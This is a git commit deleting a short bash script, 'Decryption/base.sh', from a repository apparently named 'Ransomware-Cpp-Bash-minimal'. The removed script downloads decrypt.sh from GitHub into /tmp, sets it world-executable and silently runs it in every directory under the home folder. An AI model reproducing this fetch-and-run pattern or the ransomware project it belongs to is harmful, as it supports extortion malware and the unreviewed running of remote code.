56116dd1ae8647e7d08a05cda915eb9f015beed3
Drigg3r <drigg3r@yandex.com>
2016-10-29 19:38:25 -0500

    Delete base.sh

--- Decryption/base.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-m="key1" #your decryption ke1 goes here
-n="key2" #your decryption key2 goes here
-wget -O /tmp/decrypt.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/Decryption/decrypt.sh > /dev/null 2>&1
-chmod 777 /tmp/decrypt.sh > /dev/null 2>&1
-find ~/ -type d -exec sh -c "cd '{}' ; /tmp/decrypt.sh $m $n;" \; > /dev/null 2>&1
